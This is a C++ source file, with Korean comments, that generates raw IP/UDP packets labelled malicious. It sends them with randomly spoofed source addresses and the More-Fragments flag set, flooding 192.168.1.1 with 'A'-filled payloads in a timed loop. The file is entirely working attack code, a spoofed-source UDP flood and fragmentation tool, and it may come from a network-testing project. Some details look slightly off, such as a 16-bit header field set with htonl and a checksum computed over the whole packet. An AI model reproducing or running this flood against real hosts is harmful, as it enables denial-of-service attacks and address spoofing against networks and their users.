#include <iostream>
#include <thread>
#include <chrono>
#include <cstring>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <unistd.h>
#include <cstdlib>
#include <mutex>
#include "packet_generator.h"

extern std::mutex print_mutex; // user_program.cpp에서 선언한 뮤텍스를 사용

unsigned short CheckSum(void *b, int len) {
    unsigned short *buf = (unsigned short*)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char*)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void GenerateMaliciousPackets(std::atomic<int>& totalMaliciousPacketsSent) {
    srand(static_cast<unsigned int>(time(0)));
    std::ofstream logFile("logs/packet_transmission.log", std::ios_base::app);
    logFile << "Sending packets..." << std::endl;
    {
        std::lock_guard<std::mutex> lock(print_mutex); // 출력 동기화
        std::cout << COLOR_GREEN "Packets being sent over the network for 10 seconds...\n" << COLOR_RESET << std::endl;
    }

    auto startTime = std::chrono::steady_clock::now();
    while (std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - startTime).count() < TRANSMISSION_DURATION) {
        for (int i = 0; i < PACKETS_PER_INTERVAL; i++) {
            std::string src_ip = "192.168." + std::to_string(rand() % MAX_SEGMENT_VALUE) + "." + std::to_string(rand() % MAX_SEGMENT_VALUE);
            SendMaliciousPacket(src_ip.c_str(), "192.168.1.1", 1, logFile);
            totalMaliciousPacketsSent++;
            {
                std::lock_guard<std::mutex> lock(print_mutex); // 출력 동기화
                std::cout << "\rTotal number of packets sent: " << totalMaliciousPacketsSent.load() << std::flush;
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(TRANSMISSION_INTERVAL));
    }

    logFile.close();
}

void SendMaliciousPacket(const char* src_ip, const char* dst_ip, int packet_count, std::ofstream& logFile) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    char packet[PACKET_BUFFER_SIZE];
    memset(packet, 0, PACKET_BUFFER_SIZE);

    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(dst_ip);

    iph->ihl = IP_HEADER_LENGTH;
    iph->version = IP_VERSION;
    iph->tos = IP_TYPE_OF_SERVICE;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PACKET_SIZE);
    iph->id = htonl(rand() % MAX_PACKET_ID); 
    iph->frag_off = htons(IP_MORE_FRAGMENTS); 
    iph->ttl = IP_TTL;
    iph->protocol = IPPROTO_UDP; 
    iph->check = 0; 
    iph->saddr = inet_addr(src_ip);
    iph->daddr = sin.sin_addr.s_addr;

    udph->source = htons(SOURCE_PORT);
    udph->dest = htons(DESTINATION_PORT);
    udph->len = htons(sizeof(struct udphdr) + MAX_PACKET_SIZE);
    udph->check = 0; 

    memset(packet + sizeof(struct iphdr) + sizeof(struct udphdr), 'A', MAX_PACKET_SIZE); 
    iph->check = CheckSum((unsigned short *)packet, sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PACKET_SIZE);

    for (int I = 0; I < packet_count; I++) {
        if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PACKET_SIZE, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("Packet send failed");
        } else {
            logFile << "Packet sent from " << src_ip << " to " << dst_ip << std::endl;
        }
    }

    close(sock);
}